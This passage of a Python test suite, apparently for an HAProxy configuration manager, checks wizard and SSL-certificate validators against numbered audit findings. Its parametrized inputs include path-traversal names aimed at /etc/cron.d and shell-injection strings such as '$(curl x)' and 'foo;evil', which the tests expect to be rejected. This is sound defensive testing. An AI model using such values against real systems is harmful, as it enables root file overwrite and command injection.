            f"Bulgu #20 regression: tcp + compression accepted. "
            f"Errors: {e.errors()}"
        )
        return
    raise AssertionError(
        "Bulgu #20 regression: tcp + compression must be rejected"
    )


def test_wizard_rejects_monitor_uri_on_tcp_frontend():
    """`monitor-uri /...` requires HTTP mode (HAProxy 2.4+ parse
    error in TCP frontends).
    """
    from pydantic import ValidationError
    from models.site_wizard import FrontendStep
    try:
        FrontendStep(name="fe1", mode="tcp", monitor_uri="/health")
    except ValidationError as e:
        assert any("monitor_uri" in str(err) for err in e.errors()), (
            f"Bulgu #20 regression: tcp + monitor_uri accepted. "
            f"Errors: {e.errors()}"
        )
        return
    raise AssertionError(
        "Bulgu #20 regression: tcp + monitor_uri must be rejected"
    )


def test_wizard_rejects_rate_limit_on_tcp_frontend():
    """`rate_limit` expands to a `stick-table` + `http-request track-sc0`
    + `http-request deny` pair. The `http-request` family is HTTP-only.
    """
    from pydantic import ValidationError
    from models.site_wizard import FrontendStep
    try:
        FrontendStep(name="fe1", mode="tcp", rate_limit=100)
    except ValidationError as e:
        assert any("rate_limit" in str(err) for err in e.errors()), (
            f"Bulgu #20 regression: tcp + rate_limit accepted. "
            f"Errors: {e.errors()}"
        )
        return
    raise AssertionError(
        "Bulgu #20 regression: tcp + rate_limit must be rejected"
    )


def test_wizard_rejects_timeout_http_request_on_tcp_frontend():
    """`timeout http-request` is ignored on TCP frontends (HAProxy
    emits a warning). Surface the misconfig at the model boundary.
    """
    from pydantic import ValidationError
    from models.site_wizard import FrontendStep
    try:
        FrontendStep(name="fe1", mode="tcp", timeout_http_request=5000)
    except ValidationError as e:
        assert any("timeout_http_request" in str(err) for err in e.errors()), (
            f"Bulgu #20 regression: tcp + timeout_http_request accepted. "
            f"Errors: {e.errors()}"
        )
        return
    raise AssertionError(
        "Bulgu #20 regression: tcp + timeout_http_request must be rejected"
    )


def test_wizard_reports_all_tcp_blockers_in_single_error():
    """Operator submitting MULTIPLE blockers at once gets ONE
    consolidated error message — not N separate ValidationError rounds
    — so they can fix everything in one form pass.
    """
    from pydantic import ValidationError
    from models.site_wizard import FrontendStep
    try:
        FrontendStep(
            name="fe1",
            mode="tcp",
            compression=True,
            monitor_uri="/health",
            rate_limit=100,
        )
    except ValidationError as e:
        msg_blob = " ".join(str(err) for err in e.errors())
        assert "compression=true" in msg_blob, (
            f"Bulgu #20 regression: consolidated error missing "
            f"compression. Errors: {e.errors()}"
        )
        assert "monitor_uri" in msg_blob, (
            f"Bulgu #20 regression: consolidated error missing "
            f"monitor_uri. Errors: {e.errors()}"
        )
        assert "rate_limit" in msg_blob, (
            f"Bulgu #20 regression: consolidated error missing "
            f"rate_limit. Errors: {e.errors()}"
        )
        return
    raise AssertionError(
        "Bulgu #20 regression: multi-blocker tcp payload must be rejected"
    )


def test_wizard_accepts_tcp_with_compatible_fields_only():
    """Positive control: a `mode='tcp'` frontend with only TCP-
    compatible fields (bind, maxconn, tcp_request_rules, timeout_client)
    passes."""
    from models.site_wizard import FrontendStep
    fs = FrontendStep(
        name="fe1",
        mode="tcp",
        bind_port=8443,
        maxconn=1000,
        timeout_client=30000,
        tcp_request_rules="tcp-request inspect-delay 5s",
    )
    assert fs.mode == "tcp"


def test_wizard_accepts_redirect_rules_on_http_frontend():
    """Positive control: http + redirect_rules is valid."""
    from models.site_wizard import FrontendStep
    fs = FrontendStep(
        name="fe1",
        mode="http",
        redirect_rules=[
            {
                "type": "scheme",
                "scheme": "https",
                "code": 301,
                "condition": "if !{ ssl_fc }",
            }
        ],
    )
    assert len(fs.redirect_rules) == 1


def test_normalize_does_not_strip_default_server_cookie():
    """The `default-server cookie X` directive sets a default cookie
    value for every server in the backend — it is NOT a `server`
    line, so the normalizer must leave it untouched. The strip
    is gated on `stripped.startswith('server ')` (note trailing
    space) which already excludes `default-server` — pin the
    contract.
    """
    from services.haproxy_config import (
        _normalize_haproxy_config_text_for_diff,
    )
    text = (
        "backend be-defserver\n"
        "    balance roundrobin\n"
        "    default-server cookie defcookie check inter 1000\n"
        "    server srv1 1.1.1.1:8080\n"
    )
    normalized = _normalize_haproxy_config_text_for_diff(text)
    assert 'default-server cookie defcookie' in normalized, (
        "Bulgu #15 round-5 regression: `default-server cookie X` "
        "was incorrectly stripped — that directive is the global "
        "default for the backend's servers, not a per-server "
        "attribute."
    )


# =============================================================================
# Round-11 audit: Bulgu #21 — ssl.name path-traversal vector
# =============================================================================


def _bulgu21_minimal_ssl_payload(name: str) -> dict:
    """Build the minimal SSL upload payload that exercises only the
    `name` validator. The cert content is a syntactically valid PEM
    so the renderer's content checks pass; the test isolates the
    name path-traversal validator.
    """
    cert = (
        "-----BEGIN CERTIFICATE-----\n"
        "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtest\n"
        "-----END CERTIFICATE-----"
    )
    key = (
        "-----BEGIN PRIVATE KEY-----\n"
        "MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQDxtest\n"
        "-----END PRIVATE KEY-----"
    )
    return {
        "name": name,
        "certificate_content": cert,
        "private_key_content": key,
        "usage_type": "frontend",
    }


@pytest.mark.parametrize("bad_name", [
    "../../tmp/evil",
    "../../../etc/cron.d/payload",
    "foo/bar",
    "foo\\bar",
    "foo bar",
    "foo\tbar",
    "foo;evil",
    "foo$evil",
    "foo`evil`",
    "foo|evil",
    ".hidden",
    "-rf",
    "..",
    "../foo",
    "foo/../bar",
])
def test_bulgu21_ssl_certificate_create_rejects_unsafe_name(bad_name):
    """Bulgu #21 (round-11): SSLCertificateCreate.name is used to build
    `/etc/ssl/haproxy/{name}.pem` which the agent then writes as root.
    Path-traversal, shell metacharacters, and filename CLI-flag
    confusion must be rejected at the API boundary, NOT at the agent.
    """
    from models.ssl import SSLCertificateCreate
    with pytest.raises(ValidationError):
        SSLCertificateCreate(**_bulgu21_minimal_ssl_payload(bad_name))


@pytest.mark.parametrize("good_name", [
    "site-com",
    "site_com",
    "site.com",
    "wildcard-example.com",
    "01-default",
    "ABC_123",
])
def test_bulgu21_ssl_certificate_create_accepts_safe_name(good_name):
    """Positive control — the validator must keep accepting the
    typical operator naming conventions (`<host>` / `<host-or-tag>`).
    Cert content is invalid here so a ValidationError IS expected,
    but the FIRST error must not be the name validator."""
    from models.ssl import SSLCertificateCreate
    try:
        SSLCertificateCreate(**_bulgu21_minimal_ssl_payload(good_name))
    except ValidationError as ve:
        errs = [str(e) for e in ve.errors()]
        for err in errs:
            assert "forbidden characters" not in err, (
                f"Safe name {good_name!r} rejected by name validator: {err}"
            )
            assert "path traversal" not in err, (
                f"Safe name {good_name!r} rejected by name validator: {err}"
            )


def test_bulgu21_ssl_certificate_create_rejects_whitespace_padded_name():
    """Reject ' foo' / 'foo ' — these would render as ' foo.pem' on
    disk and break `mv "$temp" "/etc/ssl/haproxy/ foo.pem"` quoting
    or shift the filename in unexpected ways."""
    from models.ssl import SSLCertificateCreate
    with pytest.raises(ValidationError):
        SSLCertificateCreate(**_bulgu21_minimal_ssl_payload("  foo"))
    with pytest.raises(ValidationError):
        SSLCertificateCreate(**_bulgu21_minimal_ssl_payload("foo  "))


def test_bulgu21_ssl_certificate_update_rejects_unsafe_name():
    """Bulgu #63 (round-22 audit) — the strict path-traversal guard
    moved from `SSLCertificateUpdate.validate_name_no_path_traversal`
    into the route handler so legacy certs with non-conforming names
    can still be updated on other fields. The PATCH path now enforces
    the rule via `routers/ssl.py::_assert_safe_cert_name` ONLY when
    the operator actually renames the cert. Pin both the new
    handler-level helper (rejects rename to unsafe names) AND that
    the model itself no longer raises for the legacy bytes (so
    unrelated UPDATEs can pass)."""
    from models.ssl import SSLCertificateUpdate
    from routers.ssl import _assert_safe_cert_name
    from fastapi import HTTPException

    # Model now accepts any name shape — the bytes round-trip cleanly.
    legacy = SSLCertificateUpdate(name="../../tmp/evil")
    assert legacy.name == "../../tmp/evil"

    # Handler-level helper still rejects path-traversal renames.
    for bad in ("../../tmp/evil", "foo/bar", ".."):
        with pytest.raises(HTTPException) as exc:
            _assert_safe_cert_name(bad)
        assert exc.value.status_code == 400


def test_bulgu21_ssl_certificate_update_allows_none_name():
    """PATCH allows name to be omitted (None) — the validator must
    be a no-op in that case."""
    from models.ssl import SSLCertificateUpdate
    upd = SSLCertificateUpdate(name=None)
    assert upd.name is None


@pytest.mark.parametrize("bad_name", [
    "../../tmp/evil",
    "foo/bar",
    "foo bar",
    ".hidden",
    "-rf",
    "..",
])
def test_bulgu21_wizard_ssl_choice_rejects_unsafe_name(bad_name):
    """Bulgu #21 (round-11): the wizard's `SSLChoice.name` must also
    reject path-traversal — wizard is one of the entry points to the
    same on-disk path."""
    from models.site_wizard import SSLChoice
    with pytest.raises(ValidationError):
        SSLChoice(
            mode="upload",
            name=bad_name,
            certificate_content="cert",
            private_key_content="key",
        )


def test_bulgu21_wizard_ssl_choice_allows_safe_names():
    """Positive control on the wizard path."""
    from models.site_wizard import SSLChoice
    for good in ["site-com", "site_com", "site.com", "ABC_123"]:
        try:
            SSLChoice(
                mode="upload",
                name=good,
                certificate_content="cert",
                private_key_content="key",
            )
        except ValidationError as ve:
            errs = [str(e) for e in ve.errors()]
            for err in errs:
                assert "forbidden characters" not in err, (
                    f"Wizard rejected safe name {good!r}: {err}"
                )


def test_bulgu21_static_validator_present_in_both_models():
    """Bulgu #63 (round-22 audit) — the SSLCertificateUpdate model
    validator was moved into the route handler. SSLCertificateCreate
    still carries the model-level guard (CREATE has no legacy data to
    grandfather) and SSLChoice (wizard) keeps its own guard. The
    route handler in `routers/ssl.py` now also carries
    `_assert_safe_cert_name` for both create + update paths."""
    ssl_src = _backend_src("models/ssl.py")
    wiz_src = _backend_src("models/site_wizard.py")
    routers_ssl_src = _backend_src("routers/ssl.py")
    assert "validate_name_no_path_traversal" in ssl_src, (
        "Bulgu #21: SSLCertificateCreate must keep its model-level "
        "path-traversal guard (CREATE is always strict)"
    )
    assert "_validate_ssl_name_no_path_traversal" in wiz_src, (
        "Bulgu #21: SSLChoice must validate path traversal"
    )
    assert "_assert_safe_cert_name" in routers_ssl_src, (
        "Bulgu #63: handler-level path-traversal helper must exist "
        "in routers/ssl.py"
    )


# =============================================================================
# Round-11 audit: Bulgu #22 — health-check fields must be >= 1
# =============================================================================


@pytest.mark.parametrize("field", ["inter", "fall", "rise"])
def test_bulgu22_server_health_check_rejects_zero(field):
    """Bulgu #22 (round-11): HAProxy parser rejects `inter 0`,
    `fall 0`, `rise 0` with explicit range errors at parse time.
    The wizard MUST reject these at submit time so the operator
    gets a field-level error instead of a vague apply-time
    `haproxy -c` failure."""
    from models.site_wizard import ServerStep
    base = {"server_name": "srv1", "server_address": "1.2.3.4", "server_port": 8080}
    base[field] = 0
    with pytest.raises(ValidationError):
        ServerStep(**base)


@pytest.mark.parametrize("field", ["inter", "fall", "rise"])
def test_bulgu22_server_health_check_accepts_one(field):
    """Positive control — minimum legal value (1) must pass."""
    from models.site_wizard import ServerStep
    base = {"server_name": "srv1", "server_address": "1.2.3.4", "server_port": 8080}
    base[field] = 1
    srv = ServerStep(**base)
    assert getattr(srv, field) == 1


@pytest.mark.parametrize("field", [
    "default_server_inter",
    "default_server_fall",
    "default_server_rise",
])
def test_bulgu22_backend_default_server_rejects_zero(field):
    """Bulgu #22 (round-11): the same HAProxy parser constraint
    applies to `default-server` line — values must be >= 1 or
    HAProxy rejects."""
    from models.site_wizard import BackendStep
    base = {"name": "be1"}
    base[field] = 0
    with pytest.raises(ValidationError):
        BackendStep(**base)


@pytest.mark.parametrize("field", [
    "default_server_inter",
    "default_server_fall",
    "default_server_rise",
])
def test_bulgu22_backend_default_server_accepts_one(field):
    from models.site_wizard import BackendStep
    base = {"name": "be1"}
    base[field] = 1
    be = BackendStep(**base)
    assert getattr(be, field) == 1


def test_bulgu22_static_ge_one_in_health_check_fields():
    """Static-source pin: `inter`, `fall`, `rise`, and the
    `default_server_*` triple must carry `ge=1`, not `ge=0`.
    Catches accidental loosening to `ge=0` during refactors.

    Round 17 update: Bulgu #45 / #46 added `le=...` upper bounds to
    the same fields, so the marker now only anchors on `ge=1,` (the
    trailing comma keeps us anchored even if the round-17 `le=`
    addition wraps differently)."""
    from pathlib import Path
    src = _backend_src("models/site_wizard.py")
    for field_name in (
        "inter", "fall", "rise",
        "default_server_inter", "default_server_fall", "default_server_rise",
    ):
        # Search for `<field>: Optional[int] = Field(\n? ... ge=1,`
        # (Bulgu #45 split some of these onto multiple lines).
        assert (
            f"{field_name}: Optional[int] = Field(" in src
            and any(
                marker in src for marker in (
                    f"{field_name}: Optional[int] = Field(default=None, ge=1,",
                    f"{field_name}: Optional[int] = Field(\n        default=None, ge=1,",
                )
            )
        ), (
            f"Bulgu #22: expected `ge=1` health-check field marker "
            f"for `{field_name}` not found in site_wizard.py"
        )


# =============================================================================
# Round-12 audit: SSL & ACME deep audit
# =============================================================================
# Bulgu #23 — cert/key pair mismatch detection
# Bulgu #24 — expired cert rejection
# Bulgu #25 — wizard domain coverage against cert SAN
# Bulgu #26 — SSLChoice.ssl_verify silent-drop mTLS guard
# Bulgu #27 — ssl_alpn format validator
# Bulgu #28 — ssl.mode='none' + https_redirect=true self-brick guard


# ---- Bulgu #23: cert/key pair mismatch ----


def _gen_self_signed_pem(common_name: str = "test.example.com"):
    """Generate a self-signed cert + private key for unit testing.

    The cryptography library round-trips its own output, so this gives
    us a real public-key match to compare against (vs hand-crafting
    PEMs which would only test the parser).
    """
    from cryptography import x509 as _x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.x509.oid import NameOID
    from datetime import datetime, timedelta, timezone

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = issuer = _x509.Name([
        _x509.NameAttribute(NameOID.COMMON_NAME, common_name),
    ])
    cert = (
        _x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(_x509.random_serial_number())
        .not_valid_before(datetime.now(timezone.utc) - timedelta(days=1))
        .not_valid_after(datetime.now(timezone.utc) + timedelta(days=365))
        .add_extension(
            _x509.SubjectAlternativeName([_x509.DNSName(common_name)]),
            critical=False,
        )
        .sign(key, hashes.SHA256())
    )
    cert_pem = cert.public_bytes(serialization.Encoding.PEM).decode()
    key_pem = key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    ).decode()
    return cert_pem, key_pem


def _gen_expired_pem(common_name: str = "expired.example.com"):
    """Generate an already-expired self-signed cert."""
    from cryptography import x509 as _x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.x509.oid import NameOID
    from datetime import datetime, timedelta, timezone

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = _x509.Name([_x509.NameAttribute(NameOID.COMMON_NAME, common_name)])
    cert = (
        _x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(subject)
        .public_key(key.public_key())
        .serial_number(_x509.random_serial_number())
        .not_valid_before(datetime.now(timezone.utc) - timedelta(days=400))
        .not_valid_after(datetime.now(timezone.utc) - timedelta(days=30))
        .add_extension(
            _x509.SubjectAlternativeName([_x509.DNSName(common_name)]),
            critical=False,
        )
        .sign(key, hashes.SHA256())
    )
    cert_pem = cert.public_bytes(serialization.Encoding.PEM).decode()
    key_pem = key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    ).decode()
    return cert_pem, key_pem


def test_bulgu23_verify_certificate_key_match_matching_pair():
    """Positive control — a freshly-generated cert/key pair must
    match by SubjectPublicKeyInfo equality."""
    from utils.ssl_parser import verify_certificate_key_match
    cert_pem, key_pem = _gen_self_signed_pem()
    result = verify_certificate_key_match(cert_pem, key_pem)
    assert result["match"] is True
    assert result["reason"] is None


def test_bulgu23_verify_certificate_key_match_mismatched_pair():
    """Negative control — a cert from pair A and a key from pair B
    must surface match=False with an actionable reason. Pre-fix the
    wizard accepted this and surfaced the mismatch only at agent
    `haproxy -c` time."""
    from utils.ssl_parser import verify_certificate_key_match
    cert_a, _ = _gen_self_signed_pem("site-a.example.com")
    _, key_b = _gen_self_signed_pem("site-b.example.com")
    result = verify_certificate_key_match(cert_a, key_b)
    assert result["match"] is False
    assert "cert public key differs" in (result["reason"] or "")


def test_bulgu23_verify_certificate_key_match_empty_inputs():
    """Empty input should return match=None (cannot compare) so
    callers fall back to the legacy validate_private_key check."""
    from utils.ssl_parser import verify_certificate_key_match
    assert verify_certificate_key_match("", "").get("match") is None
    cert_pem, key_pem = _gen_self_signed_pem()
    assert verify_certificate_key_match(cert_pem, "").get("match") is None
    assert verify_certificate_key_match("", key_pem).get("match") is None


def test_bulgu23_static_create_cert_row_calls_match_check():
    """Static-source pin: `create_cert_row` MUST invoke
    `verify_certificate_key_match` after `validate_private_key`.
    Catches accidental removal of the safety check."""
    from pathlib import Path
    src = _backend_src("services/ssl_service.py")
    assert "verify_certificate_key_match" in src, (
        "Bulgu #23: create_cert_row must call verify_certificate_key_match "
        "to detect cert/key mismatches at submit time."
    )
    assert 'match_result.get("match") is False' in src, (
        "Bulgu #23: create_cert_row must hard-reject match=False; "
        "match=None (cannot compare) is OK to pass through."
    )


# ---- Bulgu #24: expired cert rejection ----


def test_bulgu24_expired_cert_parsed_as_expired():
    """Sanity check — the parser correctly flags our generated
    expired cert with status='expired'. Without this baseline the
    next test would silently bypass the check."""
    from utils.ssl_parser import parse_ssl_certificate
    cert_pem, _ = _gen_expired_pem()
    info = parse_ssl_certificate(cert_pem)
    assert info.get("status") == "expired"
    assert info.get("days_until_expiry", 0) < 0


def test_bulgu24_static_create_cert_row_rejects_expired():
    """Static-source pin: `create_cert_row` MUST hard-reject an
    expired cert with HTTP 400. Pre-fix the row was inserted with
    status='expired' and a downstream HTTPS frontend bound to it,
    breaking every browser TLS handshake."""
    from pathlib import Path
    src = _backend_src("services/ssl_service.py")
    assert 'cert_info.get("status") == "expired"' in src, (
        "Bulgu #24: create_cert_row must check status=='expired' and reject."
    )
    assert "is already expired" in src, (
        "Bulgu #24: expired-cert error message must be informative."
    )


def test_bulgu24_static_existing_cert_branch_rejects_expired():
    """Static-source pin: the wizard's `existing` SSL branch must
    also reject expired certs (parity with create_cert_row's reject
    of upload-mode expired certs)."""
    from pathlib import Path
    src = _backend_src("routers/site_wizard.py")
    assert 'Bulgu #24 (round-12 audit) — existing-cert branch' in src, (
        "Bulgu #24: existing-cert branch must carry the round-12 expired-"
        "cert rejection marker."
    )


# ---- Bulgu #25: domain coverage ----


def test_bulgu25_domain_covered_by_cert_literal_match():
    """Literal SAN match (RFC 6125)."""
    from utils.ssl_parser import domain_covered_by_cert
    assert domain_covered_by_cert("api.example.com", ["api.example.com"])
    assert not domain_covered_by_cert("api.example.com", ["www.example.com"])


def test_bulgu25_domain_covered_by_cert_wildcard_single_label():
    """Wildcard `*.example.com` matches a SINGLE leftmost label
    (`api.example.com`) but NOT multi-label
    (`api.sub.example.com`) and NOT the bare apex
    (`example.com`)."""
    from utils.ssl_parser import domain_covered_by_cert
    assert domain_covered_by_cert("api.example.com", ["*.example.com"])
    assert not domain_covered_by_cert("api.sub.example.com", ["*.example.com"])
    assert not domain_covered_by_cert("example.com", ["*.example.com"])


def test_bulgu25_domain_covered_case_insensitive():
    """Domain matching is case-insensitive per RFC."""
    from utils.ssl_parser import domain_covered_by_cert
    assert domain_covered_by_cert("API.EXAMPLE.COM", ["api.example.com"])
    assert domain_covered_by_cert("api.example.com", ["API.EXAMPLE.COM"])


def test_bulgu25_find_uncovered_domains_preserves_order():
    """Error message orders uncovered domains as the operator typed
    them (helps them find the typo)."""
    from utils.ssl_parser import find_uncovered_domains
    out = find_uncovered_domains(
        ["a.example.com", "b.example.com", "c.example.com"],
        ["a.example.com", "c.example.com"],
    )
    assert out == ["b.example.com"]


def test_bulgu25_find_uncovered_domains_empty_inputs():
    """No domains → no uncovered. Empty cert SAN → ALL domains
    uncovered."""
    from utils.ssl_parser import find_uncovered_domains
    assert find_uncovered_domains([], ["a.example.com"]) == []
    assert find_uncovered_domains(
        ["a.example.com", "b.example.com"], []
    ) == ["a.example.com", "b.example.com"]


def test_bulgu25_static_wizard_upload_branch_calls_coverage():
    """Static-source pin: the wizard's upload branch must call
    `find_uncovered_domains` against the parsed cert SAN list
    before invoking `create_cert_row`."""
    from pathlib import Path
    src = _backend_src("routers/site_wizard.py")
    assert "find_uncovered_domains" in src, (
        "Bulgu #25: wizard must verify domain coverage against the cert SAN."
    )
    assert 'Bulgu #25 (round-12 audit)' in src, (
        "Bulgu #25: round-12 marker must be present in the wizard branch."
    )


# ---- Bulgu #26: SSLChoice ssl_verify silent-drop mTLS ----


@pytest.mark.parametrize("forbidden", ["optional", "required"])
def test_bulgu26_sslchoice_ssl_verify_rejects_mtls_modes(forbidden):
    """SSLChoice.ssl_verify must reject 'optional'/'required'
    because the renderer's client-CA path is a placeholder that
    silently drops the verify directive."""
    from models.site_wizard import SSLChoice
    with pytest.raises(ValidationError):
        SSLChoice(
            mode="upload", name="c",
            certificate_content="x", private_key_content="y",
            ssl_verify=forbidden,
        )


def test_bulgu26_sslchoice_ssl_verify_accepts_none_and_unset():
    """Positive control — 'none' and unset/None must pass."""
    from models.site_wizard import SSLChoice
    for ok in (None, "none"):
        m = SSLChoice(
            mode="upload", name="c",
            certificate_content="x", private_key_content="y",
            ssl_verify=ok,
        )
        assert m.ssl_verify == (None if ok is None else "none")


def test_bulgu26_static_validator_present():
    """Static-source pin: SSLChoice must carry the round-12
    mTLS-rejection validator."""
    from pathlib import Path
    src = _backend_src("models/site_wizard.py")
    assert "reject_ssl_verify_without_ca_file" in src, (
        "Bulgu #26: SSLChoice must validate ssl_verify against "
        "silent mTLS-drop renderer placeholder."
    )


def test_bulgu26_frontend_ui_only_offers_none():
    """Frontend pin: the wizard UI must offer ONLY 'none' for
    ssl_verify until the ca-file column is plumbed. Pre-fix the UI
    offered 'optional' and 'required' which the SSLChoice
    validator now rejects — operators would see a confusing 422.

    Round-13 audit fix: skip cleanly when the frontend source tree
    is not co-located with the backend (CI containers build the
    backend image in isolation from `../frontend`). Backend pin
    tests for backend-side validation are covered by
    `test_bulgu26_*` above this case; this single frontend pin is a
    belt-and-suspenders check that only matters in the monorepo
    workspace, not in the per-service CI image.
    """
    frontend_src_path = _BACKEND_DIR.parent / "frontend/src/components/SiteWizard.js"
    if not frontend_src_path.exists():
        pytest.skip(
            "frontend source tree not available (CI runs backend "
            "image in isolation); covered by monorepo workspace runs"
        )
    src = frontend_src_path.read_text()
    # The SSL step's ssl_verify Select must NOT contain the
    # forbidden options after this round.
    ssl_step_section = src.split("name={['ssl', 'ssl_verify']}", 1)
    assert len(ssl_step_section) == 2, (
        "Bulgu #26: SiteWizard.js must still bind a Form.Item to "
        "['ssl', 'ssl_verify']"
    )
    after_marker = ssl_step_section[1][:1500]
    assert 'Option value="optional"' not in after_marker, (
        "Bulgu #26: SiteWizard.js SSL step still offers ssl_verify "
        "'optional' even though SSLChoice now rejects it."
    )
    assert 'Option value="required"' not in after_marker, (
        "Bulgu #26: SiteWizard.js SSL step still offers ssl_verify "
        "'required' even though SSLChoice now rejects it."
    )


# ---- Bulgu #27: ssl_alpn format validator ----


@pytest.mark.parametrize("good", [
    "h2",
    "http/1.1",
    "h2,http/1.1",
    "acme-tls/1",
    "h2, http/1.1",  # whitespace-padded tokens are normalised
])
def test_bulgu27_ssl_alpn_accepts_canonical_protocols(good):
    """Common IANA ALPN registry IDs must pass.

    Round 17 update: Bulgu #48 now requires `ssl_min_ver` to be
    'TLSv1.2' or 'TLSv1.3' when the ALPN list advertises 'h2',
    matching RFC 7540 section 9.2's TLS 1.2 minimum for HTTP/2.
    Pass an explicit min_ver so this test exercises ONLY the ALPN
    grammar validator (the cross-field consistency is covered by
    dedicated round-17 tests below)."""
    from models.site_wizard import SSLChoice
    advertises_h2 = "h2" in [tok.strip() for tok in good.split(",")]
    kwargs = {"mode": "none", "ssl_alpn": good}
    if advertises_h2:
        kwargs["ssl_min_ver"] = "TLSv1.2"
    m = SSLChoice(**kwargs)
    # Whitespace-padded inputs are re-joined without spaces
    assert " " not in (m.ssl_alpn or "")
    assert m.ssl_alpn


@pytest.mark.parametrize("bad", [
    "h2;evil",
    "h2,",        # trailing comma → empty token
    "h2,,http/1.1",
    "h2 evil",    # space inside a token
    "$(curl x)",
    "h2`evil`",
])
def test_bulgu27_ssl_alpn_rejects_invalid_tokens(bad):
    """Invalid characters / empty tokens must be rejected at the
    wizard boundary instead of surfacing at the agent's
    `haproxy -c`."""
    from models.site_wizard import SSLChoice
    with pytest.raises(ValidationError):
        SSLChoice(mode="none", ssl_alpn=bad)


def test_bulgu27_ssl_alpn_none_passes():
    """None/empty must coerce to None (no alpn directive emitted)."""
    from models.site_wizard import SSLChoice
    m = SSLChoice(mode="none", ssl_alpn=None)
    assert m.ssl_alpn is None
    m = SSLChoice(mode="none", ssl_alpn="")
    assert m.ssl_alpn is None


# ---- Bulgu #28: ssl.mode='none' + https_redirect self-brick guard ----


def _bulgu28_site_kwargs(**overrides):
    base = {
        "cluster_id": 1,
        "domains": ["www.example.com"],
        "backend": {"name": "be"},
        "servers": [{
            "server_name": "s1",
            "server_address": "10.0.0.1",
            "server_port": 80,
        }],
        "frontend": {"name": "fe", "bind_port": 80},
        "ssl": {"mode": "none"},
    }
    base.update(overrides)
    return base


def test_bulgu28_rejects_ssl_none_plus_https_redirect_flag():
    """ssl.mode='none' + frontend.https_redirect=true is a
    self-bricking config — redirect points at a port with nothing
    listening. Reject at submit instead of letting the site go
    dark post-apply."""
    from models.site_wizard import SiteCreate
    kwargs = _bulgu28_site_kwargs(
        frontend={"name": "fe", "bind_port": 80, "https_redirect": True},
        ssl={"mode": "none"},
    )
    with pytest.raises(ValidationError) as exc_info:
        SiteCreate(**kwargs)
    msg = str(exc_info.value)
    assert "ssl.mode" in msg and "https_redirect" in msg, (
        "Bulgu #28: error message must name both fields"
    )


def test_bulgu28_rejects_ssl_none_plus_explicit_scheme_https_redirect():
    """Same brick via an explicit redirect_rules entry with
    type=scheme / scheme=https."""
    from models.site_wizard import SiteCreate
    kwargs = _bulgu28_site_kwargs(
        frontend={
            "name": "fe", "bind_port": 80,
            "https_redirect": False,
            "redirect_rules": [{
                "type": "scheme", "scheme": "https", "code": 301,
                "condition": "!{ ssl_fc }",
            }],
        },
        ssl={"mode": "none"},
    )
    with pytest.raises(ValidationError):
        SiteCreate(**kwargs)


def test_bulgu28_allows_ssl_none_with_location_redirect():
    """A `redirect_rules` entry with type='location' (NOT scheme→https)
    must still be allowed under ssl.mode='none' — it's a normal HTTP
    L7 redirect, not a TLS upgrade. Pre-fix would over-block this
    legitimate case."""
    from models.site_wizard import SiteCreate
    kwargs = _bulgu28_site_kwargs(
        frontend={
            "name": "fe", "bind_port": 80,
            "https_redirect": False,
            "redirect_rules": [{
                "type": "location",
                "location": "/new",
                "code": 302,
                "condition": "",
            }],
        },
        ssl={"mode": "none"},
    )
    SiteCreate(**kwargs)  # must not raise


def test_bulgu28_allows_ssl_upload_plus_https_redirect():
    """ssl.mode='upload' creates an HTTPS frontend, so
    https_redirect is the standard HTTP→HTTPS bounce — must pass."""
    from models.site_wizard import SiteCreate
    kwargs = _bulgu28_site_kwargs(
        frontend={"name": "fe", "bind_port": 80, "https_redirect": True},
        ssl={
            "mode": "upload", "name": "stub-cert",
            "certificate_content": (
                "-----BEGIN CERTIFICATE-----\nstub\n-----END CERTIFICATE-----"
            ),
            "private_key_content": (
                "-----BEGIN PRIVATE KEY-----\nstub\n-----END PRIVATE KEY-----"
            ),
        },
    )
    SiteCreate(**kwargs)  # must not raise


def test_bulgu28_static_marker():
    """Static-source pin: the cross-validator must remain in
    SiteCreate.enforce_acme_apply_and_http."""
    from pathlib import Path
    src = _backend_src("models/site_wizard.py")
    assert 'Bulgu #28 (round-12 audit)' in src, (
        "Bulgu #28: ssl.mode='none' + https_redirect guard marker "
        "missing from site_wizard.py"
    )


# ============================================================================
# Round 13 — ACME deep-dive (Bulgu #29 — #32)
# ============================================================================


# ---- Bulgu #29: auto-generated https_redirect must exclude ACME challenge ----


def test_bulgu29_auto_https_redirect_excludes_acme_challenge_path():
    """`_build_redirect_rules(https_redirect=true)` must render a
    condition that SKIPS `/.well-known/acme-challenge/<token>` so the
    HTTP-01 validator can reach the agent's
    `_acme_challenge_backend` even when the operator turned on the
    HTTPS redirect switch."""
    from routers.site_wizard import _build_redirect_rules
    from models.site_wizard import SiteCreate
    p = SiteCreate(
        cluster_id=1,
        domains=["www.example.com"],
        frontend={"name": "fe", "bind_port": 80, "https_redirect": True},
        backend={"name": "be"},
        servers=[{
            "server_name": "s1", "server_address": "10.0.0.1",
            "server_port": 80,
        }],
        ssl={
            "mode": "upload", "name": "stub-cert",
            "certificate_content": (
                "-----BEGIN CERTIFICATE-----\nstub\n-----END CERTIFICATE-----"
            ),
            "private_key_content": (
                "-----BEGIN PRIVATE KEY-----\nstub\n-----END PRIVATE KEY-----"
            ),
        },
    )
    rules = _build_redirect_rules(p)
    assert len(rules) == 1
    rule = rules[0]
    assert rule["type"] == "scheme"
    assert rule["scheme"] == "https"
    cond = rule["condition"]
    # Legacy backward-compat: still skips HTTPS requests
    assert "!{ ssl_fc }" in cond, (
        "Bulgu #29 regression: scheme=https redirect must still gate "
        "on !{ ssl_fc } — otherwise it loops on requests that came "
        "in over HTTPS already."
    )
    # New Bulgu #29 clause: skips ACME challenge paths
    assert "/.well-known/acme-challenge/" in cond, (
